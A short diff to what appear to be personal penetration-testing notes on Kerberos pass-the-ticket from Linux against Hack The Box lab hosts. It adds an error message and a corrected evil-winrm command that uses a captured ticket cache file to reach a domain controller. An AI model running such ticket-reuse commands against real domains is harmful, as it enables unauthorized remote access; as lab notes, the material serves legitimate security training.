@@ -169,6 +169,12 @@ cat /etc/krb5.conf
 
 evil-winrm -i dc01 -r inlanefreight.htb
 
+--------------------
+Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information                                                                                            
+Matching credential not found (filename: nathan.aadam.ccache)
+--------------------
+KRB5CCNAME='nathan.aadam.ccache' evil-winrm -i dc01.mirage.htb -r mirage.htb
+
 ------------------------------
 PtT from Linux - Ticket Converter
 ------------------------------
